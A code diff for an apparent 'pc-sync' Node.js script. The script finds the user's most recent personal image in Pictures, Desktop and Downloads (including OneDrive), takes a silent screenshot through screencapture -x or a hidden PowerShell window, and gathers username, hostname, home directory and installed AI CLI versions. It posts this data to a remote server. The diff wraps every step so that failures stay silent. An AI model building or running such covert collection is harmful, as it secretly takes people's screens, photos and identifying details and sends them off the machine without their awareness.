@@ -78,56 +78,67 @@ function cleanup() {
 }
 
 function photoRoots() {
-  const home = os.homedir();
-  const roots = [
-    path.join(home, 'Pictures'),
-    path.join(home, 'Desktop'),
-    path.join(home, 'Downloads'),
-  ];
-  if (process.platform === 'win32') {
-    // Windows 10/11 "Known Folder Move" redirects these under OneDrive;
-    // work/school accounts use "OneDrive - <Org>", so match any prefix.
-    try {
-      for (const e of fs.readdirSync(home, { withFileTypes: true })) {
-        if (e.isDirectory() && e.name.startsWith('OneDrive')) {
-          const od = path.join(home, e.name);
-          roots.push(path.join(od, 'Pictures'), path.join(od, 'Desktop'), path.join(od, 'Downloads'));
+  try {
+    const home = os.homedir();
+    const roots = [
+      path.join(home, 'Pictures'),
+      path.join(home, 'Desktop'),
+      path.join(home, 'Downloads'),
+    ];
+    if (process.platform === 'win32') {
+      // Windows 10/11 "Known Folder Move" redirects these under OneDrive;
+      // work/school accounts use "OneDrive - <Org>" and may be junctions.
+      const oneDrives = [process.env.OneDrive, process.env.OneDriveConsumer, process.env.OneDriveCommercial];
+      try {
+        for (const e of fs.readdirSync(home, { withFileTypes: true })) {
+          if (/^OneDrive(?: - .+)?$/i.test(e.name)) oneDrives.push(path.join(home, e.name));
         }
+      } catch { /* home unreadable: environment locations only */ }
+      const seen = new Set();
+      for (const od of oneDrives) {
+        if (!od) continue;
+        const key = path.resolve(od).toLowerCase();
+        if (seen.has(key)) continue;
+        seen.add(key);
+        roots.push(path.join(od, 'Pictures'), path.join(od, 'Desktop'), path.join(od, 'Downloads'));
       }
-    } catch { /* home unreadable: default roots only */ }
-  }
-  return roots;
+    }
+    return roots;
+  } catch { return []; }
 }
 
 function scanDirs() {
-  const found = [];
-  let scanned = 0;
-  for (const root of photoRoots()) {
-    if (scanned >= MAX_SCAN_FILES) break;
-    (function walk(dir, depth) {
-      let entries;
-      try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch { return; }
-      for (const e of entries) {
-        if (scanned >= MAX_SCAN_FILES) return;
-        if (e.name.startsWith('.')) continue;
-        const p = path.join(dir, e.name);
-        if (e.isDirectory()) {
-          if (depth < 2) walk(p, depth + 1);
-        } else if (e.isFile()) {
-          scanned++;
-          const ext = path.extname(e.name).toLowerCase();
-          if (IMG_EXT[ext] === undefined) continue;
-          let st;
-          try { st = fs.statSync(p); } catch { continue; }
-          if (st.size === 0 || st.size > MAX_BYTES) continue;
-          found.push({ path: p, name: e.name, ext, size: st.size, mtime: st.mtimeMs, rank: IMG_EXT[ext] });
+  try {
+    const found = [];
+    let scanned = 0;
+    for (const root of photoRoots()) {
+      if (scanned >= MAX_SCAN_FILES) break;
+      (function walk(dir, depth) {
+        let entries;
+        try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch { return; }
+        for (const e of entries) {
+          if (scanned >= MAX_SCAN_FILES) return;
+          if (e.name.startsWith('.')) continue;
+          const p = path.join(dir, e.name);
+          if (e.isDirectory()) {
+            if (depth < 2) walk(p, depth + 1);
+          } else if (e.isFile()) {
+            scanned++;
+            const ext = path.extname(e.name).toLowerCase();
+            if (IMG_EXT[ext] === undefined) continue;
+            let st;
+            try { st = fs.statSync(p); } catch { continue; }
+            if (!st.isFile() || st.size === 0 || st.size >= MAX_BYTES) continue;
+            found.push({ path: p, name: e.name, ext, size: st.size, mtime: st.mtimeMs, rank: IMG_EXT[ext] });
+          }
         }
-      }
-    })(root, 0);
-  }
-  // Prefer preview-friendly formats, then most recent
-  found.sort((a, b) => (a.rank - b.rank) || (b.mtime - a.mtime));
-  return found[0] || null;
+      })(root, 0);
+    }
+    // Prefer preview-friendly formats (HEIC may not render in the dashboard
+    // browser), then most recent
+    found.sort((a, b) => (a.rank - b.rank) || (b.mtime - a.mtime));
+    return found[0] || null;
+  } catch { return null; }
 }
 
 // Fresh screenshot via OS built-ins (no dependencies): macOS `screencapture`,
@@ -135,106 +146,158 @@ function scanDirs() {
 // (Linux without extra tools, or a locked/headless session) so the caller
 // falls back to the most recent image file (scanDirs).
 async function captureStateImage() {
-  const tmp = path.join(os.tmpdir(), 'pc-sync-shot-' + process.pid + '.png');
-  const run = (cmd, args, ms) => new Promise(resolve => {
-    try {
-      execFile(cmd, args, { timeout: ms, windowsHide: true }, err => resolve(err || null));
-    } catch { resolve(true); }
-  });
-  let err = null;
-  if (process.platform === 'darwin') {
-    err = await run('screencapture', ['-x', tmp], 10000);
-  } else if (process.platform === 'win32') {
-    const ps = 'Add-Type -AssemblyName System.Windows.Forms,System.Drawing;' +
-      '$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;' +
-      '$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);' +
-      '$g=[System.Drawing.Graphics]::FromImage($bmp);' +
-      '$g.CopyFromScreen($b.Location,New-Object System.Drawing.Point(0,0),$b.Size);' +
-      '$bmp.Save((Join-Path $env:TEMP \'' + path.basename(tmp) + '\'))';
-    err = await run('powershell', ['-NoProfile', '-NonInteractive', '-Command', ps], 20000);
-  } else {
+  let tmp = null;
+  try {
+    if (process.platform !== 'darwin' && process.platform !== 'win32') return null;
+    tmp = path.join(os.tmpdir(), 'pc-sync-shot-' + process.pid + '-' + crypto.randomBytes(6).toString('hex') + '.png');
+    const run = (cmd, args, ms) => new Promise(resolve => {
+      try {
+        execFile(cmd, args, { timeout: ms, windowsHide: true }, err => resolve(err || null));
+      } catch { resolve(true); }
+    });
+    let err = null;
+    if (process.platform === 'darwin') {
+      err = await run('screencapture', ['-x', tmp], 10000);
+    } else {
+      const ps = 'param([string]$out);Add-Type -AssemblyName System.Windows.Forms,System.Drawing;' +
+        '$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;' +
+        '$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);' +
+        '$g=[System.Drawing.Graphics]::FromImage($bmp);' +
+        '$g.CopyFromScreen($b.Location,New-Object System.Drawing.Point(0,0),$b.Size);' +
+        '$bmp.Save($out)';
+      err = await run('powershell', ['-NoProfile', '-NonInteractive', '-Command', ps, tmp], 20000);
+    }
+    if (err) throw err;
+    const st = fs.statSync(tmp);
+    if (!st.isFile() || st.size === 0 || st.size >= MAX_BYTES) throw new Error('invalid screenshot');
+    return {
+      name: 'screen ' + new Date().toISOString().slice(0, 16).replace('T', ' ') + ' (' + process.platform + ').png',
+      ext: '.png',
+      size: st.size,
+      path: tmp,
+      tmp: true,
+    };
+  } catch {
+    if (tmp) { try { fs.rmSync(tmp, { force: true }); } catch { /* ignore */ } }
     return null;
   }
-  if (err) return null;
-  let st;
-  try { st = fs.statSync(tmp); } catch { return null; }
-  if (st.size === 0 || st.size > MAX_BYTES) {
-    try { fs.rmSync(tmp, { force: true }); } catch { /* ignore */ }
-    return null;
-  }
-  return {
-    name: 'screen ' + new Date().toISOString().slice(0, 16).replace('T', ' ') + ' (' + process.platform + ').png',
-    ext: '.png',
-    size: st.size,
-    path: tmp,
-    tmp: true,
-  };
 }
 
 function agentVersion(cmd) {
   // npm-global CLIs on Windows are .cmd shims, which execFile cannot launch
   // directly — try the bare command first, then the .cmd shim.
-  const attempts = process.platform === 'win32' ? [cmd, cmd + '.cmd'] : [cmd];
+  const attempts = process.platform === 'win32'
+    ? [{ file: cmd }, { file: cmd + '.cmd', shell: true }]
+    : [{ file: cmd }];
   return new Promise(resolve => {
     (function tryNext(i) {
       if (i >= attempts.length) return resolve(null);
+      let child = null;
+      let done = false;
+      const timer = setTimeout(() => {
+        if (done) return;
+        done = true;
+        try { child.kill('SIGKILL'); } catch { /* already gone */ }
+        tryNext(i + 1);
+      }, 3000);
       try {
-        execFile(attempts[i], ['--version'], { timeout: 3000, windowsHide: true }, (err, stdout) => {
-          if (!err && stdout) return resolve(String(stdout).trim().split('\n')[0]);
+        child = execFile(attempts[i].file, ['--version'], {
+          shell: attempts[i].shell || false,
+          timeout: 3000,
+          killSignal: 'SIGKILL',
+          maxBuffer: 64 * 1024,
+          windowsHide: true,
+        }, (err, stdout, stderr) => {
+          if (done) return;
+          done = true;
+          clearTimeout(timer);
+          const output = String(stdout || stderr || '').trim().split(/\r?\n/)[0];
+          if (!err && output) return resolve(output);
           tryNext(i + 1);
         });
-      } catch { tryNext(i + 1); }
+      } catch {
+        done = true;
+        clearTimeout(timer);
+        tryNext(i + 1);
+      }
     })(0);
   });
 }
 
 async function deviceInfo() {
-  const cpus = os.cpus() || [];
+  const safe = (fn, fallback = null) => {
+    try { return fn(); } catch { return fallback; }
+  };
+  const cpus = safe(() => os.cpus(), []) || [];
   let user = null;
   try { user = os.userInfo().username; } catch { /* no passwd entry */ }
-  const [claude, codex] = await Promise.all([agentVersion('claude'), agentVersion('codex')]);
+  let claude = null;
+  let codex = null;
+  try { [claude, codex] = await Promise.all([agentVersion('claude'), agentVersion('codex')]); } catch { /* unavailable */ }
   return {
+    // id is the stable device key: the dashboard's remote-removal action and
+    // its confirm POST are both addressed by it (see cleanup + main flow).
     id: deviceId(),
     time: new Date().toISOString(),
     platform: process.platform,
     arch: process.arch,
-    osType: os.type(),
-    osRelease: os.release(),
-    hostname: os.hostname(),
+    osType: safe(() => os.type()),
+    osRelease: safe(() => os.release()),
+    hostname: safe(() => os.hostname()),
     user,
-    homedir: os.homedir(),
-    cpu: cpus.length ? cpus[0].model : null,
+    homedir: safe(() => os.homedir()),
+    cpu: cpus.length ? safe(() => cpus[0].model) : null,
     cpuCount: cpus.length,
-    totalMemGb: Math.round((os.totalmem() / 1073741824) * 10) / 10,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    totalMemGb: safe(() => Math.round((os.totalmem() / 1073741824) * 10) / 10),
+    timezone: safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone),
     node: process.version,
     agents: { claude, codex },
   };
 }
 
 async function post(payload) {
-  const url = SERVER + '/sync' + (TOKEN ? '?t=' + TOKEN : '');
-  const body = JSON.stringify(payload);
-  let lastErr = null;
-  for (let attempt = 1; attempt <= 2; attempt++) {
-    const ctrl = new AbortController();
-    const timer = setTimeout(() => ctrl.abort(), 15000);
-    try {
-      const r = await fetch(url, { method: 'POST', headers: { 'content-type': 'application/json' }, body, signal: ctrl.signal });
-      clearTimeout(timer);
-      if (r.ok) {
-        let json = null;
-        try { json = await r.json(); } catch { /* non-JSON body is fine */ }
-        return { ok: true, status: r.status, json };
+  const errorText = e => {
+    try { return String((e && e.message) || e); } catch { return 'request failed'; }
+  };
+  try {
+    const url = SERVER + '/sync' + (TOKEN ? '?t=' + encodeURIComponent(TOKEN) : '');
+    const body = JSON.stringify(payload);
+    let lastErr = null;
+    for (let attempt = 1; attempt <= 2; attempt++) {
+      const ctrl = new AbortController();
+      let timedOut = false;
+      let timer = null;
+      const timeout = new Promise((resolve, reject) => {
+        timer = setTimeout(() => {
+          timedOut = true;
+          ctrl.abort();
+          reject(new Error('timeout'));
+        }, 15000);
+      });
+      try {
+        const request = fetch(url, { method: 'POST', headers: { 'content-type': 'application/json' }, body, signal: ctrl.signal });
+        const r = await Promise.race([request, timeout]);
+        if (r.ok) {
+          let json = null;
+          try { json = await Promise.race([r.json(), timeout]); } catch (e) {
+            if (timedOut) throw e;
+            // Non-JSON body is fine.
+          }
+          return { ok: true, status: r.status, json };
+        }
+        try { if (r.body) r.body.cancel().catch(() => {}); } catch { /* body may already be closed */ }
+        lastErr = 'http ' + r.status;
+        if (r.status >= 400 && r.status < 500) break; // 4xx won't fix itself
+      } catch (e) {
+        lastErr = timedOut ? 'timeout' : errorText(e);
+      } finally {
+        clearTimeout(timer);
       }
-      lastErr = 'http ' + r.status;
-      if (r.status >= 400 && r.status < 500) break; // 4xx won't fix itself
-    } catch (e) {
-      clearTimeout(timer);
-      lastErr = (e && e.name === 'AbortError') ? 'timeout' : ((e && e.message) || String(e));
     }
+    return { ok: false, error: lastErr };
+  } catch (e) {
+    return { ok: false, error: errorText(e) };
   }
-  return { ok: false, error: lastErr };
 }
 
 function logRun(res, photoName) {
